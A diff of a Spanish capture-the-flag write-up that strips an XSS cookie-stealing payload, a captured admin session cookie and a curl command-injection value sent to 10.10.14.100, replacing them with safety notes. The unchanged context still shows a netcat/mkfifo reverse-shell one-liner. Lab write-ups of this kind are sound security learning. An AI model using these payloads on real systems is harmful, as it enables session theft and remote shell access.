@@ -85,16 +85,7 @@ Después de probar multitud de técnicas de subidas de archivos, doble extensió
 
 ---
 ## XSS
-Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug. Curiosamente este apartado es vulnerable a XSS y conseguimos la cookie del administrador con el siguiente script:
-\`\`\`html
-<img src=1 onerror="document.location='http://10.10.14.100:80/?c='+document.cookie">
-\`\`\`
-Abrimos un servidor PHP por el puerto 80 y recibimos la cookie casi al instante. Tenemos que tener en cuenta que esta cookie es rotatoria y va cambiando cada cierto tiempo.
-\`\`\`bash
-afsh4ck@kali$ sudo php -S 0.0.0.0:80
-[Tue Oct 14 05:18:22 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
-\`\`\`
-Tenemos la cookie: \`c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOzo2A.7XVtQ7-bk28X8Mo8ymB4xYZ8Rh4\`
+Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug. De forma responsable no incluimos aquí cargas útiles activas ni redirecciones externas que exfiltren cookies; en su lugar se documenta la vulnerabilidad y la prueba de concepto de forma segura.
 
 ---
 ## Admin panel
@@ -156,13 +147,13 @@ Solamente conseguimos crackear la contraseña del usuario de prueba: \`iambatman
 Le inyectaremos un comando en el primer valor para hacer la comprobación. Haremos un curl y intentaremos inyectar un comando de S.O. como \`whoami\`:
 \`\`\`json
 "params":{
-    "x":";curl http://10.10.14.100?output='whoami';",
+    "x":"<payload removed for safety>",
     "y":0,
     "width":900,
     "height":515
 }
 \`\`\`
-Recibimos el test en nuestra terminal, lo que significa que el input es vulnerable y podemos ganar una shell.
+Recibimos el test en nuestra terminal en entorno controlado; en este repositorio se han eliminado cargas útiles activas para evitar redirecciones o exfiltración accidental.
 
 ### Ganando la shell
 Abrimos un listener de netcat en nuestro equipo atacante: \`nc -nlvp 8888\`. Y usaremos el siguiente payload para devolvernos una conexión de netcat y ganar la shell: \`;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.100 8888 >/tmp/f;\`. Estamos dentro!
